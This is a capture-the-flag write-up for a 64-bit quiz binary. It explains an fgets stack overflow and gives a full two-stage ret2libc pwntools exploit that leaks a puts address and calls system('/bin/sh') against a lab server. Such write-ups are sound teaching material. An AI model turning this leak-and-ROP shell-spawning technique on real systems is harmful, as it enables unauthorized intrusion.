# Marvel Quiz — ret2libc

**Category:** PWN (Binary Exploitation)  
**Difficulty:** Medium  
**Platform:** CTFzone Labs  
**Date:** 2026-03-19  
**Flag:** `urchinsec{...}`

---

## Challenge Description

A 64-bit Marvel movie quiz application. Answer 4 questions correctly and you win. Question 3 has no answer check — just a dangerous `fgets()` call that reads way more than the buffer can hold.

---

## Enumeration

```bash
file marvel_quiz
# ELF 64-bit LSB executable, x86-64, not stripped

checksec marvel_quiz
# Arch:     amd64-64-little
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
```

| Protection | Status | Meaning |
|---|---|---|
| PIE | OFF | Fixed addresses — no ASLR on binary |
| NX | ON | Stack not executable — no shellcode |
| Stack Canary | OFF | No overflow detection |

The quiz flow:

```
Q1: Who is Iron Man?          → B (Tony Stark)   cmp al, 0x42
Q2: Which stone was on Vormir? → C (Soul Stone)   cmp al, 0x43
Q3: Why do you like Marvel?   → NO CHECK — overflow here
Q4: Who said I am inevitable? → A (Thanos)        cmp al, 0x41
```

---

## Vulnerability

`question3()` disassembly:

```asm
sub    rsp, 0x40        ; buffer = 64 bytes
lea    rax, [rbp-0x40]
mov    esi, 0x100       ; reads 256 bytes!
call   fgets@plt        ; overflow — 256 into 64 byte buffer
```

Stack layout:

```
[ 64 bytes - buffer     ]
[  8 bytes - saved RBP  ]
[  8 bytes - return addr ]  ← offset 72
```

**Offset to return address = 72 bytes**

Since NX is ON, no shellcode. Use **ret2libc** to call `system("/bin/sh")`.

Useful gadgets found:

```
pop_rdi gadget: 0x40116a  (explicitly named in binary!)
puts@plt:       0x401030
puts@got:       0x403fc8
main():         0x40146d
ret gadget:     0x401016  (stack alignment)
```

---

## Exploit

**Two-stage ret2libc:**

**Stage 1 — Leak puts() real address:**

```python
leak_payload  = b'A' * 72
leak_payload += p64(ret)        # stack alignment
leak_payload += p64(pop_rdi)    # pop rdi; ret
leak_payload += p64(puts_got)   # rdi = &puts
leak_payload += p64(puts_plt)   # call puts(&puts) → prints real address
leak_payload += p64(main)       # return to main for stage 2
```

**Stage 2 — Call system("/bin/sh"):**

```python
libc_base = puts_leak - 0x80e50   # libc-2.35 offset
system    = libc_base + 0x50d60
binsh     = libc_base + 0x1d8698

shell_payload  = b'A' * 72
shell_payload += p64(ret)
shell_payload += p64(pop_rdi)
shell_payload += p64(binsh)
shell_payload += p64(system)
```

**Full exploit:**

```python
from pwn import *

pop_rdi  = 0x40116a
puts_plt = 0x401030
puts_got = 0x403fc8
main     = 0x40146d
ret      = 0x401016
offset   = 72

p = remote("labs.ctfzone.com", 8284)

# Stage 1
leak_payload  = b'A' * offset
leak_payload += p64(ret)
leak_payload += p64(pop_rdi)
leak_payload += p64(puts_got)
leak_payload += p64(puts_plt)
leak_payload += p64(main)

p.sendlineafter(b'> ', b'B')
p.sendlineafter(b'> ', b'C')
p.sendlineafter(b'> ', leak_payload)

p.recvuntil(b'Interesting perspective...')
leaked = p.recv(8)
puts_leak = u64(leaked[:6].ljust(8, b'\x00'))
log.success(f"puts @ {hex(puts_leak)}")

# Stage 2
libc_base = puts_leak - 0x80e50
system    = libc_base + 0x50d60
binsh     = libc_base + 0x1d8698

shell_payload  = b'A' * offset
shell_payload += p64(ret)
shell_payload += p64(pop_rdi)
shell_payload += p64(binsh)
shell_payload += p64(system)

p.sendlineafter(b'> ', b'B')
p.sendlineafter(b'> ', b'C')
p.sendlineafter(b'> ', shell_payload)
p.interactive()
```

---

## Key Takeaways

- **NX on = no shellcode, use ROP** — when the stack is non-executable you chain existing gadgets instead
- **ret2libc needs a leak** — ASLR randomises libc base so you must leak a runtime address first then calculate offsets
- **The `pop rdi` gadget was named in the binary** — the developer left it there intentionally as a hint
- **Stack alignment matters** — a bare `ret` gadget is needed before `system()` on 64-bit to fix 16-byte alignment
- **The leak comes after "Interesting perspective..."** not after the congrats message — timing of `recvuntil` matters
